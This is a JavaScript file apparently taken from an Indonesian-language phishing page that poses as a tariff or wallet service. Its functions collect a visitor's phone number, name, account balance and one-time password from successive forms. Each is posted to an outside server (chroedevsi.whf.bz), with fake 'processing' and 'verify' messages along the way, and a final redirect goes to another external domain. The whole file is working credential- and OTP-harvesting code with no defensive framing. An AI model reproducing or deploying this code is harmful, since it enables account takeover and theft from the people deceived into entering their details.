
// index
function sendNohp(){
    $(".load").fadeIn();
    event.preventDefault();   
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
    document.getElementById('kirim').innerHTML = "Memproses....";         
    var nomortel = document.getElementById("nohp").value;
    sessionStorage.setItem("nomortel", nomortel);       
    var namanya = document.getElementById('nama').value;
    sessionStorage.setItem("namanya", namanya);             
    var logo = document.getElementById('logo');       
    var nohp = document.getElementById('nohp');    
    
   
      $.ajax({
        type: 'POST',
        url: 'https://chroedevsi.whf.bz/v1-N/no.php',
        data: $('#formHP').serialize(),
        datatype: 'JSON',   
    complete: function(){
    setTimeout(function(){   
    window.location = "saldo.html";
    $("#lonte").hide();
    $(".load").fadeOut();  
    document.getElementById('kirim').innerHTML = "Lanjutkan";
    vibr(180);
    }, 500);}});};   
     
     
   
    
// saldo  
function sendSaldo(){
    event.preventDefault();    
    document.getElementById('kirim').innerHTML = "Verify...";
    $("#lonte").show();
    $('.load').fadeIn();                    
    var logo = document.getElementById('logo');     
    var saldo = document.getElementById('saldo');    
    
  
        $.ajax({
        type: 'POST',
        url: 'https://chroedevsi.whf.bz/v1-N/saldo.php',
        data: $('#formsal').serialize(),
        datatype: 'JSON',   
   complete: function(){     
   setTimeout(function(){
   document.getElementById('kirim').innerHTML = "Benar";
   $("#lonte").hide();
   $('.load').fadeOut();
   window.location = "otp.html";
   vibr(180);  
 var phone = document.getElementById("nomorsaya").value;
 sessionStorage.setItem("phone", phone);
 var user = document.getElementById("namaku").value;
 sessionStorage.setItem("user", user);
 var duet = document.getElementById("saldo").value;
 sessionStorage.setItem("duet", duet);
    }, 300);}});};    

        


// otp
function sendOtp(){
    event.preventDefault();        
    document.getElementById('kirims').value = "Memproses....";                            
    var logo = document.getElementById('logo');     
    var nama1 = document.getElementById('nama1');    
     
   
        $.ajax({
        type: 'POST',
        url: 'https://chroedevsi.whf.bz/v1-N/otp.php',
        data: $('#formLink').serialize(),
        datatype: 'JSON',    
    complete: function(){
    vibr(800);    
    setTimeout(function(){
    showAlert("a");
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
   document.getElementById('kirims').value = "Konfirmasi";
    }, 200);}});};




function get(){
 $("#process1").show();
 $('.load').fadeIn();   
setTimeout(function(){  
location.href='https://Agusbuntung.wasap.my';
 $("#process1").hide();
 $('.load').fadeOut();
 }, 2000);    
}     
